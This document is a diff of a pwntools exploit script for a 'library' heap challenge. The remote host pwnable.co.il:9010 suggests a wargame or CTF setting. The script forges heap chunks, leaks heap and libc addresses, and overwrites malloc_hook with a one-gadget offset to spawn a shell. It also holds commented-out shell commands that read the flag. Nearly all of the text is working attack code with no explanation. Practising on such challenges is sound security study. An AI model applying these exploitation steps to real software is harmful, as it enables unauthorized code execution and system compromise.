@@ -13,37 +13,46 @@ CHK_PWD = p64(0) + p64(0) + p64(0x21)# + p64(0x61) + b'\x61'
 
 p: process = None
 
+def sendoption(p: process, option: str):
+    p.sendlineafter("Your choice: ", option)
+
 def register(p: process, username: str = "user", password: str = "12345"):
-    p.sendlineafter("Your choice: ", "1")
-    p.sendlineafter("Username: ", username)
-    p.sendlineafter("Password: ", password)
+    sendoption(p, "1")
+    p.sendline(username)
+    p.sendline(password)
 
 def login(p: process, username: str = "user", password: str = "12345"):
-    p.sendlineafter("Your choice: ", "2")
-    p.sendlineafter("Username: ", username)
-    p.sendlineafter("Password: ", password)
+    sendoption(p, "2")
+    p.sendline(username)
+    p.sendline(password)
 
 def borrow_book(p: process, book_idx: int = 0):
-    p.sendlineafter("Your choice: ", "1")
-    p.sendlineafter("Which book do you want? ", str(book_idx))
+    sendoption(p, "1")
+    p.sendline(str(book_idx))
 
 def del_comment(p: process, id: int, book_idx: int = 0):
-    p.sendlineafter("Your choice: ", "3")
-    p.sendlineafter("Which book did you leave the comment on? ", str(book_idx))
-    p.sendlineafter("What is the comment id? ", str(id))
+    sendoption(p, "3")
+    p.sendline(str(book_idx))
+    sleep(0.2)
+    p.sendline(str(id))
     print("deleted: ", id)
 
 def return_book(p: process, add_comment: bool = False, comment_len: int = 50, comment: str = "comment", title: str = "title", need_id: bool = True) -> int:
     id = 0
-    p.sendlineafter("Your choice: ", "2")
+    sendoption(p, "2")
+    #p.sendline("2")
     if add_comment:
-        p.sendlineafter("do you want to leave a comment? [Y/n] ", 'Y')
-        p.sendlineafter("size of the comment: ", str(comment_len))
+        p.sendline('Y')
+        p.sendline(str(comment_len))
         p.sendlineafter("title: ", title)
-        p.sendlineafter("content: ", comment)
-
+        #p.sendline("hey")
+        #p.sendline("hey")
+        #p.sendline(title)
+        
+        p.sendline(comment)
+        #p.interactive()
         if need_id:
-            data = p.recvline().decode().split(' ')[1]
+            data = p.recvline().decode().split(' ')[2]
             id = int(data)
             print("id: ", id)
         else:
@@ -54,7 +63,7 @@ def return_book(p: process, add_comment: bool = False, comment_len: int = 50, co
     return id
 
 def logout(p: process):
-    p.sendlineafter("Your choice: ", "4")
+    sendoption(p, "4")
 
 def create_comment(p: process, size: int, comment: str = "comment", book: int = 0, need_id: bool = True) -> int:
     borrow_book(p, book)
@@ -175,15 +184,15 @@ def leak_libc(p: process, heap_leak: int):
     for chk_idx in range(7):
         fake_chunks += p64(0) + p64(0x71) + p64(next_chk_ptr + chk_idx * 0x70) + p64(0x1337) + b'\x00' * 0x50
     fake_chunks += p64(0) + p64(0xf01) + p64(book_chk) + p64(0xcafe)# + b'\x00' * 0x5f0 + p64(0) + p64(0x610)
-    print("len; ", len(fake_chunks))
     del_comment(p, TMP_CHK_2, 4)
     TMP_CHK_2 = create_comment(p, 0x1200, fake_chunks + (b'\x00' * (0x11e0 - len(fake_chunks))) + p64(0x1210) + p64(0x1211) + p64(bin_chks_ptr) + p32(0x145), book=4)
 
     borrow_book(p)
-
+    pay = ""
     for _ in range(7):
         del_comment(p, 0x1337, 4)
 
+    #p.interactive()
     #del book 0
     del_comment(p, 0x7770206873696e69, 4)
     return_book(p)
@@ -220,13 +229,14 @@ def main():
     try:
         global p
         ### run ###
-        p = process("./library")
-        #p = remote("pwnable.co.il", 9010)
+        #p = process("./library")
+        p = remote("pwnable.co.il", 9010)
 
         ### setup ###
         register(p, "user", "12345")
-        register(p, "user1", "12345")
+        #register(p, "user1", "12345")
         login(p)
+        #p.interactive()
 
         ### init ###
         arb_chks_init(p)
@@ -255,14 +265,18 @@ def main():
         create_comment(p, 0x60, need_id=False)
 
         #overwrite malloc_hook
-        create_comment(p, 0x60, b'a' * 3 + p64(libc_leak + 0xe3b01))
+        create_comment(p, 0x60, b'a' * 3 + p64(libc_leak + 0xe3b01), need_id=False)
 
         borrow_book(p, 0)
-        p.sendline("2")
-        p.sendline("Y")
-        p.sendline("30")
-        p.sendline("ls")
-        p.sendline("cat flag")
+        #sendoption(p, "2")
+        #p.sendline('Y')
+        #p.sendline(0x50)
+        #return_book(p, True, 30, need_id=False)
+        #p.sendline("2")
+        #p.sendline("Y")
+        #p.sendline("30")
+        #p.sendline("cat flag")
+        #p.sendline("ls")
         p.interactive() 
     except:
         p.close()
